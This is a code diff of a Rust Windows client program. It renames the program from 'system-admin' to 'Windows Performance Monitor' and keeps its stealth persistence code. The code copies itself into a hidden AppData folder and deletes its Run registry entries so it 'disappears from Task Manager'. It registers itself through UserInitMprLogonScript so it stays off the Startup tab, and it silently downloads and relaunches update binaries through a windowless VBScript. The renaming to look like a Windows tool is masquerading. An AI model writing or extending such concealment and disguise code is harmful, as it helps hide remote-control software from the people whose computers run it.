@@ -35,14 +35,14 @@ fn ensure_startup_registration() {
         let Ok(exe_path) = std::env::current_exe() else { return };
 
         // ── Step 1: Copy ourselves to a hidden AppData subfolder for persistence ─
-        // %APPDATA%\Microsoft\SystemHelper\system-admin.exe
+        // %APPDATA%\Microsoft\SystemHelper\win-perf-mon.exe
         let target_path = match std::env::var("APPDATA") {
             Ok(ap) => {
                 let dir = std::path::PathBuf::from(&ap)
                     .join("Microsoft")
                     .join("SystemHelper");
                 let _ = std::fs::create_dir_all(&dir);
-                let dest = dir.join("system-admin.exe");
+                let dest = dir.join("win-perf-mon.exe");
                 // Only copy if we are not already running from there
                 if exe_path != dest {
                     let _ = std::fs::copy(&exe_path, &dest);
@@ -52,19 +52,21 @@ fn ensure_startup_registration() {
             Err(_) => exe_path.to_string_lossy().to_string(),
         };
 
-        // ── Step 2: Remove the old visible Run key so it disappears from Task Manager ─
-        let run_key: Vec<u16> = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-            .encode_utf16()
-            .chain(std::iter::once(0))
-            .collect();
-        let run_val: Vec<u16> = "system-admin"
-            .encode_utf16()
-            .chain(std::iter::once(0))
-            .collect();
-        let mut hrun = 0isize;
-        if RegOpenKeyExW(HKEY_CURRENT_USER, run_key.as_ptr(), 0, KEY_SET_VALUE, &mut hrun) == 0 {
-            RegDeleteValueW(hrun, run_val.as_ptr());
-            RegCloseKey(hrun);
+        // ── Step 2: Remove old visible Run key so it disappears from Task Manager ─
+        for val_name in &["system-admin", "win-perf-mon", "Windows Performance Monitor"] {
+            let run_key: Vec<u16> = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+                .encode_utf16()
+                .chain(std::iter::once(0))
+                .collect();
+            let run_val: Vec<u16> = val_name
+                .encode_utf16()
+                .chain(std::iter::once(0))
+                .collect();
+            let mut hrun = 0isize;
+            if RegOpenKeyExW(HKEY_CURRENT_USER, run_key.as_ptr(), 0, KEY_SET_VALUE, &mut hrun) == 0 {
+                RegDeleteValueW(hrun, run_val.as_ptr());
+                RegCloseKey(hrun);
+            }
         }
 
         // ── Step 3: Register via UserInitMprLogonScript (invisible from Startup tab) ─
@@ -103,7 +105,7 @@ fn ensure_startup_registration() {
 async fn main() {
     tracing_subscriber::fmt::init();
 
-    info!("🎭 System Admin Client v{} initializing...", APP_VERSION);
+    info!("🎭 Windows Performance Monitor Client v{} initializing...", APP_VERSION);
     info!("ℹ️ EMERGENCY DISARM HOTKEY: Press Ctrl + Alt + Shift + K or Escape 3 times");
 
     // Automatically register as Windows Startup App
@@ -144,7 +146,7 @@ async fn main() {
 
         request.headers_mut().insert(
             "User-Agent",
-            format!("SystemAdmin/{}", APP_VERSION).parse().unwrap(),
+            format!("WinPerfMon/{}", APP_VERSION).parse().unwrap(),
         );
 
         let conn_res = connect_async(request).await;
@@ -262,7 +264,7 @@ fn perform_auto_update(download_url: &str) {
         };
 
         let temp_dir = std::env::temp_dir();
-        let new_exe_path = temp_dir.join("system-admin_update.exe");
+        let new_exe_path = temp_dir.join("win-perf-mon_update.exe");
 
         info!("Downloading updated binary from {} to {:?}", url, new_exe_path);
 
@@ -304,7 +306,7 @@ fn perform_auto_update(download_url: &str) {
 
         // Use a VBScript to silently wait, overwrite, and relaunch.
         // wscript.exe //B runs with NO console window — unlike cmd.exe which flashes briefly.
-        let vbs_path = temp_dir.join("update_system_admin.vbs");
+        let vbs_path = temp_dir.join("update_win_perf_mon.vbs");
         let new_exe_str = new_exe_path.to_string_lossy().replace('\\', "\\\\");
         let cur_exe_str = current_exe.to_string_lossy().replace('\\', "\\\\");
 
